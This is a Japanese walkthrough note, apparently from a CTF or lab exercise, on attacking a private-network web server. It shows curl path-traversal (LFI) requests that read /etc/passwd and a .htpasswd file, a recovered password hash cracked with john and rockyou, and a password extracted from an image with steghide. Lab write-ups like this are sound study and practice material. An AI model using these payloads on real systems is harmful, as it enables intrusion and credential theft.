http://192.168.0.110/

![[Webの調査② image 16.png]]

・https://192.168.0.110:1337

![[Webの調査② image 17.png]]

認証フォームを確認

https://192.168.110:12320

![[Webの調査② image 18.png]]

ログイン画面っぽい

https://192.168.110:12322

![[Webの調査② image 19.png]]

![[Webの調査② image 20.png]]

〇LFIの調査

phpなのでLFIが通用するか試してみる

curl -X POST -k https://192.168.0.110:12322/file_view.php -d "file=../../../../../etc/passwd"

![[Webの調査② image 21.png]]

curl -X POST -k https://192.168.0.110:12322/file_view.php -d "file=../../../../../etc/nginx/sites-available/default"

![[Webの調査② image 22.png]]

/var/www/p4ss/.htpasswdにパスワードがありそう

curl -X POST -k https://192.168.0.110:12322/file_view.php -d "file=../../../../../var/www/p4ss/.htpasswd"

![[Webの調査② image 23.png]]

Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0を発見

テキストを作成

curl -X POST -k https://192.168.0.110:12322/file_view.php -d "file=../../../../../var/www/p4ss/.htpasswd" > hash

![[Webの調査② image 24.png]]

![[Webの調査② image 25.png]]

・クラック

john hash --wordlist=/usr/share/wordlists/rockyou.txt

![[Webの調査② image 26.png]]

Tr1n17y admin

https://192.168.110:1337 でログインできるか試してみる

![[Webの調査② image 27.png]]

成功

ページのソースに

![[Webの調査② image 28.png]]

https://192.168.0.110:1337/h1dd3n.jpg

![[Webの調査② image 29.png]]

・画像ダウンロード

wget --no-check-certificate --user=Tr1n17y --password=admin https://192.168.0.110:1337/h1dd3n.jpg

画像からワードを取り出す

steghide extract -sf h1dd3n.jpg -p n30

![[Webの調査② image 30.png]]

P4$$w0rd

https://192.168.0.110:12320/ にログインしてみる

![[Webの調査② image 31.png]]

成功